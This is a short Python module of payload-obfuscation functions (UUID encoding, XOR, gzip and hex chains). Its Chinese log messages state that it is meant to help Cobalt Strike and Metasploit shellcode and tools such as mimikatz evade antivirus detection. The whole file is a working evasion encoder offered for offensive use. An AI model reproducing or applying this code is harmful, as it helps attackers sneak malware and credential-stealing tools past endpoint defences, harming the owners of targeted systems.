from uuid import UUID
import binascii,gzip

def Confuse_uuid(content):
    print("[*] 正在调用基于uuid的混淆函数")
    offset = 0
    out = ""
    while (offset < len(content)):
        countOfBytesToConvert = len(content[offset:])
        if countOfBytesToConvert < 16:
            ZerosToAdd = 16 - countOfBytesToConvert
            byteString = content[offset:] + (b'\x00' * ZerosToAdd)
            uuid = UUID(bytes_le=byteString)
        else:
            byteString = content[offset:offset + 16]
            uuid = UUID(bytes_le=byteString)
        offset += 16
        out += "{}".format(uuid)
    print("[*] Encode:Confuse_uuid Payload length: %s "%len(out))
    return out

def Confuse_xor_str(content,key):
    print("[*] 正在调用基于str的XOR异或混淆函数")
    out = ""
    for i in content:
        out +=  chr(ord(i) ^ key)
    print("[*] Encode:Confuse_xor_str Payload length: %s "%len(out))
    return out

def Confuse_xor_file(content,key):
    print("[*] 正在调用基于byte的XOR异或混淆函数")
    out = b""
    for i in content:
        i =hex(i ^ key).replace("0x","")
        if len(i) <2:
            i = "0"+i
        out += bytes.fromhex(i)
    print("[*] Encode:Confuse_xor_file Payload length: %s "%len(out))
    return out

def Confuse_gzip_xor(content,key):
    print("[*] 正在调用gzip > xor混淆函数 可用于shellcode mimikatz等工具 压缩体积规避查杀")
    data = gzip.compress(content)
    out = Confuse_xor_file(data,key)
    print("[*] Encode:Confuse_gzip_xor Payload length: %s "%len(out))
    return out

def Confuse_uuid_xor_gzip_hex(content,key):
    print("[*] 正在调用uuid > xor > gzip > hex 混淆函数 适用于CS与MSF生成的SHELLCODE  规避查杀")
    data = Confuse_uuid(content)
    data = Confuse_xor_str(data,key)
    data = gzip.compress(data.encode())
    out = binascii.b2a_hex(data).decode()
    print("[*] Encode:Confuse_uuid_xor_gzip_hex Payload length: %s "%len(out))
    return out
  
